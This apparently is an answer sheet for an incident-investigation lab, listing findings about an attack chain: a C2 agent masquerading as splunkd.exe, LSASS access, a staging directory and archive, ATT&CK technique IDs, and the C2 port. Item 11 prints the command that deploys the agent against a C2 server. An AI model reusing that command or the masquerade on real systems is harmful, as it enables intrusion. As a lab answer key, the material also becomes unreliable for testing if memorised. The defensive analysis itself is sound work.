---
tags: [analysis, flags]
---

# Flags (Answers)

1. Run-key persistence? No — [[T1547.001 (negative)]]
2. Sysmon EID for LSASS access → **10**
3. Techniques in chain → ~30
4. First execution → 2026-07-05 06:13:27 UTC ([[splunkd.exe (malicious)]])
5. Agent path → `C:\Users\Public\splunkd.exe`
6. Persistence → none via registry (negative)
7. Staging dir → `C:\Windows\system32\staged`
8. Archive → ZIP ([[staged.zip]])
9. C2 port → 8888
10. Discovery → [[T1087.001]]
11. Deploy cmd → `anmar_hacking.exe -server http://192.168.67.128:8888 -group red`
12. Total abilities → 35
